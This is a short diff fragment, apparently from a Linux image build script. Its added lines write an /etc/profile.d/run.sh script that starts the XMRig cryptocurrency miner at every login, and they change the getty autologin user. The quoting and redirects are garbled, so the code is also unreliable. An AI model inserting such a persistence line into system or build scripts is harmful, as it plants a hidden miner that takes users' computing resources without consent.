@@ -1,4 +1,5 @@
-"xmrig/."="~/xmrig"
-@'systemctl start NetworkManager.service && system'
-@"sed -i "s/rm -rf \/etc\/systemd\/system\/getty@tty1.service.d//g" $ssfn"
+'xmrig/."="~/xmrig'
+@'echo -e "systemctl start NetworkManager.service\nchmod +x ~/xmrig/xmrig\n~/xmrig/xmrig" >au /etc/profile.d/run.sh'
+%"sed -i "s/rm -rf \/etc\/systemd\/system\/getty@tty1.service.d//g" $ssfn"
+@'sed -i "s/root/www9song/g" /etc/systemd/system/getty@tty1.service.d'
 !yay
